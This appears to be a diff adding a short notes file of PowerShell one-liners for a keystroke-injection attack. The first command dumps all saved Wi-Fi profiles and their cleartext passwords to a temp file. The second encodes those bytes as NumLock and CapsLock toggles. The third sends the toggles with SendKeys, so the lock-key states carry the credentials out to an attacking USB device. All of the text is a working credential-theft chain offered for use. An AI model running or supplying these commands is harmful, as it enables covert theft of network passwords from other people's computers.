@@ -1,0 +1,8 @@
+get wlan profiles
+$list=((netsh.exe wlan show profiles) -match '\s:\s') -replace '.*:\s', '';foreach($network in $list){ ((netsh wlan show profile $network key=clear) -match 'sselinhalt.*:|SSID-n.*:|SSID n|Key C') | Out-File -append -FilePath $env:tmp\test.txt -Encoding ascii};exit
+
+Convert to numlock/capslock pattern:
+$o = '';foreach($b in $(cat $env:tmp\test.txt -En by)){foreach($a in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){if($b -band $a){$o += '%{NUMLOCK}';}else{$o += '%{CAPSLOCK}';}}};$o += '%{SCROLLLOCK}';echo $o | Out-File -FilePath $env:tmp\out.txt
+
+send them:
+$o=(cat $env:tmp\out.txt);Add-Type -A System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait($o);
